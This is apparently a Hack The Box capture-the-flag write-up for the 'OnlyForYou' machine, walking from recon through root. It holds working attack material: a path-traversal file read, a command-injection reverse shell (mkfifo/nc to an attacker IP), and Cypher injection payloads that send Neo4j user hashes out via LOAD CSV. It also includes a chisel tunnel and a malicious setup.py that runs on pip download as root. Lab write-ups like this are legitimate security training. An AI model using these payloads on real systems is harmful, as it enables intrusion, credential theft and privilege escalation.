# HTB - OnlyForYou
## Start: 29/04/23
## Finish: 08/05/23
## IP: 10.10.11.210
---
## Info Gathering
### Nmap Scan
```
nmap -sV -sC 10.10.11.210                                                                                                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 17:28 BST
Nmap scan report for 10.10.11.210
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds

```

### CURL
```
curl onlyforyou.htb                                                                        
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>

curl -L onlyforyou.htb
curl: (6) Could not resolve host: only4you.htb

```

Included only4you.htb into `/etc/hosts` and website connects correctly.

### WEB ANALYSIS
### http://only4you.htb
Single page site interesting info:
- Link to beta.only4you.htb
- email address info@only4you.htb

### http://beta.only4you.htb
Site hosting demo tools interesting info:
- Source code downloadable
- "image resizer" tool
- "file converter" tool

### GOBUSTER dirs
Nothing for only4you.htb, stuff for beta.only4you.htb

```
 gobuster-linux-amd64/gobuster dir -u http://beta.only4you.htb/ -w ~/Programs/Security/Lists/SecLists/Discovery/Web-Content/raft-medium-words.txt               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://beta.only4you.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/elliot/Programs/Security/Lists/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/29 17:43:02 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 405) [Size: 683]
/list                 (Status: 200) [Size: 5934]
/source               (Status: 200) [Size: 12127]
/resize               (Status: 200) [Size: 2984] 
/convert              (Status: 200) [Size: 2760] 


```


## Vulnerability Hunting

### Source code analysis
Inital thoughts are on the download function within app.py 
```
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```
Exploiting this is just too easy, it just needs to be an absolute path and the application will happily provide any file as long as it exists.
![Directory Traversal 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/directory_traversal1.png)

So 2 users we may need to look out for being John and Dev

### LFI Vulnerability
Using the Local File Inclusion vulnerability, i searched for default configuration files, knowing the site was hosted on NGINX, i searched
`/etc/nginx/nginx.conf` which didn't give anything useful, checking `/etc/nginx/sites-enabled/default` however...

```
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

which led me to perform the same LFI on `/var/www/beta.only4you.htb/app.py` to see if we recieved the source code as expected...
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 29 Apr 2023 18:31:20 GMT
Content-Type: text/x-python; charset=utf-8
Content-Length: 4551
Connection: close
Content-Disposition: attachment; filename=app.py
Last-Modified: Sun, 11 Dec 2022 13:25:09 GMT
Cache-Control: no-cache
ETag: "1670765109.8359272-4551-3480357964"

from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
...
```
I perform the same on the main page, stands to reason that the developer used the same python backend to host both, so i did the same on `/var/www/only4you.htb/app.py` ...
```
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr
        status = sendmessage(email, subject, message, ip)
...
```
This seems to be what controls that email form previously seen, i also attempted to see if this `form` import is also locally included in this directory. `/var/www/only4you.htb/form.py`

I will attempt to only show the relevant code lines here.
```
def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
    else:
        domain = email.split("@", 1)[1]
        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
        output = result.stdout.decode('utf-8')
        if "v=spf1" not in output:
            return 1
        else:
        domains = []
        ips = []
        if "include:" in output:
            dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
            dms.pop(0)
            for domain in dms:
                domains.append(domain)
            while True:
                for domain in domains:
                    result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```
This starts by checking our provided email against this regex, it then takes the domain by splitting the email by the @ symbol and taking the 1st (2nd) var in the list.

However this implementation is flawed, the regex can be bypassed to provide an IP address instead of a domain by including a seperate `@` symbol.

e.g. `test@10.10.14.77@google.com` will pass the regex AND the code will assign domain = 10.10.11.1

So as we can provide a controlled ip as the "domain" which the system will use the `dig` command against to get a txt record from it. It will then take the output, as long as the output includes `v=spf1` the code will then look for instances of `include:`, seperate them into a list and remove the first with `pop(0)`. It will then run dig again against the list objects.

The problem with this is again the regex does not hold up to more testing, if the output is multiple `include:`, as long as one of them contains a domain suffix the whole is treated legitmately.

e.g. `include: teehee include: ; echo 'PWND' include:.ds`

So as we can see there is an oppurtunity for RCE due to the usage of `subprocess.run()` in this python script. 

To test this vulnerability, i create a fakedns server which will respond to txt queries with: `include: test include: ; nc -e /bin/sh 10.10.14.77 4444`

While exploiting this i found that the secondary exploit of setting up a dns server wasn't needed, the first dig command can be exploited by simply adding a `;` after the domain and then a command straight after.

e.g. `&email=test@google.com; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.77 4444 >/tmp/f`

## Initial Access: www-data

```
Connection received on 10.10.11.210 58992
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
### LinPeas
Inside the box, linpeas is ran, as seen before, neo4j is running but the user www-data does not have permissions to access it directly via cli.
```
╔══════════╣ Analyzing Neo4j Files (limit 70)
-rw-r--r-- 1 root root 733 Nov 21 07:59 v

-rwxr-xr-x 1 root root 2969 Dec  4 22:22 /etc/init.d/neo4j

drwxr-x--- 2 neo4j adm 4096 Mar 30 11:51 /etc/neo4j
find: ‘/etc/neo4j’: Permission denied

-rwxr-xr-x 1 root root 259 Mar 23 15:01 /usr/bin/neo4j

drwxr-sr-x 12 root staff 4096 Mar 30 11:51 /usr/local/lib/python3.8/dist-packages/neo4j

drwxr-xr-x 2 root root 4096 Mar 30 11:51 /usr/share/doc/neo4j

-rw-r--r-- 1 root root 312 Mar 23 15:01 /usr/share/lintian/overrides/neo4j

drwxr-x--- 7 neo4j adm 4096 Mar 30 11:51 /usr/share/neo4j
find: ‘/usr/share/neo4j’: Permission denied

drwxr-x--- 10 neo4j adm 4096 Mar 30 11:51 /var/lib/neo4j
find: ‘/var/lib/neo4j’: Permission denied

drwxr-xr-x 2 neo4j adm 4096 Mar 30 12:08 /var/log/neo4j
```

More hosted services are avaliable only locally on this machine.
```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1020/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
```
Specifically, 3000, 8001, 3306 (sql), 7474 and 7687 (neo4j)

### Chisel

To be able to access these services i initiate a reverse tunnel from the target to our attacking machine using `chisel` which is built for exactly this.

To tunnel this, i start a chisel server for reverse tunneling with `chisel server -p 9001 --reverse` 

The chisel binary is then uploaded to the targets `/tmp/` dir and ran in client mode tunneling the local ports to our attacking machine `chisel client 10.10.14.77:9001 R:3306:localhost:3306 R:3000:localhost:3000 R:8001:localhost:8001 R:7474:localhost:7474`

## Info gathering round 2

### Port 3000 (cogs)
Interesting:
- Gogs: self hosted git repos
- users noted: administrator, John

### Port 8001 (demo site)
Interesting:
- Demo management site, uses admin:admin creds
- Has an employee search which seems to target a database.
    - It 500 errors when a `'` is included

### Port 7474 (neo4j)
Interesting:
- Neo4j default creds do not work

## neo4j injection

I'm new when it comes to cypher injection, i can think about it in terms of sql injection in this specific instance but i know there are more interesting things involved here..
The injectable page is on the employee search page.

![Neo4j injection](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/neo4jinjection1.png)

```
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.65:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```
```
10.10.11.210 - - [07/May/2023 15:07:18] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
```
From this injection we can see version 5.6 of neo4j, but as per usual we are looking for a way to gain more access, in this case we should look to user accounts we could potentially make use of.

```
1' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.65:8000/?l='+label as l RETURN 0 as _0 //
```

```
10.10.11.210 - - [07/May/2023 15:20:15] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:15] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:20:16] "GET /?l=employee HTTP/1.1" 200 -
```

We can already see the employee labelled in the actual app, so i will try and load the user labels.

```
1' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.65:8000/?'+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

```
10.10.11.210 - - [07/May/2023 15:25:16] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:25:16] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:25:16] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 15:25:16] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
```

Well these look like hashes, may as well put them through hashcat or john if that doesn't work..

![Passwords](https://github.com/e-war/Writeups/blob/master/HackTheBox/OnlyForYou/Screenshots/extractedpw1.png)

Well that was easy enough, not very good passwords, but where are they used? 



Well john:ThisIs4You works in:
- Cogs
- SSH

```
ssh john@10.10.11.210         
john@10.10.11.210's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

```

wow that was a little tricky, but i guess this is what custom password lists are for.

## privilege escalation
Compared to finding user access, root access here seems very very simple, `sudo -l` shows we are able to run `pip download` as root without password as long as it comes from the cogs site. 
```
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

Well we have access to cogs now with the password cracked from before, and it just so happens that pip download can be exploited to run code under the running user, in this case root.
This is a pretty good writeup of this concept: https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/


setup.py
```
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def a():
    os.system('cp /root/root.txt /tmp/1 ; chmod 777 /tmp/1')

class RunEggInfoCommand(egg_info):
    def run(self):
        a()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        a()
        install.run(self)

setup(
    name = "open",
    version = "1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)

```

build this with
`pythom -m build`. Upload the .tar.gz from the dist to the cogs repo...

![Upload to cogs]()


`sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/tedt5/raw/master/open-1.tar.gz`
http://localhost:3000/john/tedt5/raw/master/open-1.tar.gz

and 
```
john@only4you:/tmp$ cat 1
2f4a************************971
```

All done, the priv esc was something i've seen a fair few times, i'm decently familiar with searching for access with `sudo -l`, but finding that initial access was difficult, going into one service account to access another service account via `chisel` is something i should look at more as there are typically a lot more interesting services running internally on most machines, and more surface means more to attack...